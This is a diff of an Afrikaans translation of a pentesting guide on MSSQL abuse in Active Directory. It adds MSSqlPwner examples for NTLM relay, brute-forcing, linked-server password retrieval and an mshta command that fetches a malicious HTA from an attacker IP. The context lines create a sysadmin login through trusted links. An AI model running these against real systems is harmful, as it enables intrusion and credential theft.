@@ -21,7 +21,73 @@ Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 
 ## **MSSQL Enumerasie / Ontdekking**
 
-Die powershell module [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) is baie nuttig in hierdie geval.
+### Python
+Die [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) hulpmiddel is gebaseer op impacket, en laat ook outentisering toe met behulp van kerberos kaartjies, en aanval deur skakelkettings.
+
+<figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
+```shell
+# Interactive mode
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
+
+# Interactive mode with 2 depth level of impersonations
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth  -max-impersonation-depth 2 interactive
+
+
+# Executing custom assembly on the current server with windows authentication and executing hostname command
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname
+
+# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname
+
+# Executing the hostname command using stored procedures on the linked SRV01 server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname
+
+# Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate
+
+# Issuing NTLM relay attack on the SRV01 server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on the local server with custom command
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
+
+# Executing direct query
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth direct-query "SELECT CURRENT_USER"
+
+# Retrieving password from the linked server DC01
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrive-password
+
+# Execute code using custom assembly on the linked server DC01
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 inject-custom-asm SqlInject.dll
+
+# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt
+
+# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt
+
+# Bruteforce using tickets against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt
+
+# Bruteforce using passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
+
+# Bruteforce using hashes against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
+
+```
+### Opname vanaf die netwerk sonder domeinsessie
+```
+# Interactive mode
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
+```
+---
+###  Powershell
+
+Die powershell-module [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) is baie nuttig in hierdie geval.
 ```powershell
 Import-Module .\PowerupSQL.psd1
 ```
@@ -60,7 +126,7 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ## MSSQL Basiese Misbruik
 
-### Toegang DB
+### Toegang tot DB
 ```powershell
 #Perform a SQL query
 Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
@@ -81,7 +147,7 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 ```
 Check in die bladsy genoem in die **volgende afdeling hoe om dit handmatig te doen.**
 
-### MSSQL Basiese Hacking Trukke
+### MSSQL Basiese Hacking Tricks
 
 {% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
 [pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
@@ -89,7 +155,7 @@ Check in die bladsy genoem in die **volgende afdeling hoe om dit handmatig te do
 
 ## MSSQL Vertroude Skakels
 
-As 'n MSSQL-instansie vertrou (databasis skakel) deur 'n ander MSSQL-instansie. As die gebruiker bevoegdhede oor die vertroude databasis het, sal hy in staat wees om **die vertrouensverhouding te gebruik om navrae ook in die ander instansie uit te voer**. Hierdie vertroue kan geketting word en op 'n sekere punt mag die gebruiker in staat wees om 'n verkeerd geconfigureerde databasis te vind waar hy opdragte kan uitvoer.
+As 'n MSSQL-instansie vertrou (databasis skakel) deur 'n ander MSSQL-instansie. As die gebruiker voorregte oor die vertroude databasis het, sal hy in staat wees om **die vertrouensverhouding te gebruik om navrae ook in die ander instansie uit te voer**. Hierdie vertroue kan geketting word en op 'n sekere punt mag die gebruiker in staat wees om 'n verkeerd geconfigureerde databasis te vind waar hy opdragte kan uitvoer.
 
 **Die skakels tussen databasisse werk selfs oor woudvertroue.**
 
@@ -133,15 +199,15 @@ Jy kan maklik vir vertroude skakels kyk met metasploit.
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-Let op dat metasploit slegs die `openquery()` funksie in MSSQL sal probeer misbruik maak (so, as jy nie 'n opdrag met `openquery()` kan uitvoer nie, sal jy die `EXECUTE` metode **handmatig** moet probeer om opdragte uit te voer, sien meer hieronder.)
+Let wel dat metasploit slegs die `openquery()` funksie in MSSQL sal probeer misbruik maak (so, as jy nie 'n opdrag met `openquery()` kan uitvoer nie, sal jy die `EXECUTE` metode **handmatig** moet probeer om opdragte uit te voer, sien meer hieronder.)
 
 ### Handmatig - Openquery()
 
 Van **Linux** kan jy 'n MSSQL konsole-skal met **sqsh** en **mssqlclient.py** verkry.
 
-Van **Windows** kan jy ook die skakels vind en opdragte handmatig uitvoer met 'n **MSSQL-kliënt soos** [**HeidiSQL**](https://www.heidisql.com)
+Van **Windows** kan jy ook die skakels vind en opdragte handmatig uitvoer met 'n **MSSQL kliënt soos** [**HeidiSQL**](https://www.heidisql.com)
 
-_Registrasie met Windows-verifikasie:_
+_Registrasie met Windows-outeentifikasie:_
 
 ![](<../../.gitbook/assets/image (808).png>)
 
@@ -174,9 +240,9 @@ SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", '
 ```
 If you cannot perform actions like `exec xp_cmdshell` from `openquery()` try with the `EXECUTE` method.
 
-### Manual - EXECUTE
+### Handmatig - EXECUTE
 
-Jy kan ook vertroude skakels misbruik deur `EXECUTE` te gebruik:
+Jy kan ook vertroude skakels misbruik maak deur `EXECUTE`:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
@@ -184,9 +250,9 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 ```
 ## Plaaslike Privilege Escalation
 
-Die **MSSQL plaaslike gebruiker** het gewoonlik 'n spesiale tipe voorreg genaamd **`SeImpersonatePrivilege`**. Dit stel die rekening in staat om "n kliënt na verifikasie na te doen".
+Die **MSSQL plaaslike gebruiker** het gewoonlik 'n spesiale tipe voorreg genaamd **`SeImpersonatePrivilege`**. Dit stel die rekening in staat om "‘n kliënt na verifikasie te verteenwoordig".
 
-'n Strategie wat baie outeurs ontwikkel het, is om 'n SYSTEM-diens te dwing om te verifieer met 'n rogue of man-in-the-middle diens wat die aanvaller skep. Hierdie rogue diens kan dan die SYSTEM-diens naboots terwyl dit probeer om te verifieer.
+‘n Strategie wat baie outeurs ontwikkel het, is om 'n SYSTEM-diens te dwing om te verifieer by 'n rogue of man-in-the-middle diens wat die aanvaller skep. Hierdie rogue diens kan dan die SYSTEM-diens verteenwoordig terwyl dit probeer om te verifieer.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) het 'n versameling van hierdie verskillende tegnieke wat uitgevoer kan word via Beacon se `execute-assembly` opdrag.
 
